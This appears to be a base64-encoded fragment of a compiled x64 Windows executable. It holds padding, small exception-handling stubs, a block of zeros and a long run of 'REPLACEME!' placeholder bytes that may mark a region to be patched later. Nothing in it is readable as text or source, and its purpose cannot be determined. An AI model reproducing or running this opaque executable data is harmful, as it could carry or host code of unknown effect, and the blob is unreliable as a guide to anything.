zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFVIg+wgSIvqD7ZNIOgqnv//kEiDxCBdw8zMzMzMzMxAVUiD7CBIi+roOp///5APtk0g6ASe//+QSIPEIF3DzMzMzMzMzMzMzMzMzMzMzMxAVUiD7DBIi+pIiU04SItFOEiLAIsAiUU0SItFOItNNEiJRCQoiUwkIEyNDXCl//9Mi0Vgi1VYSItNUOhun///kEiDxDBdw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVUiD7CBIi+pIiU1ISItFSEiLAIsAiUUki0UkPQUAAMB1CcdFIAEAAADrB8dFIAAAAACLRSBIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRS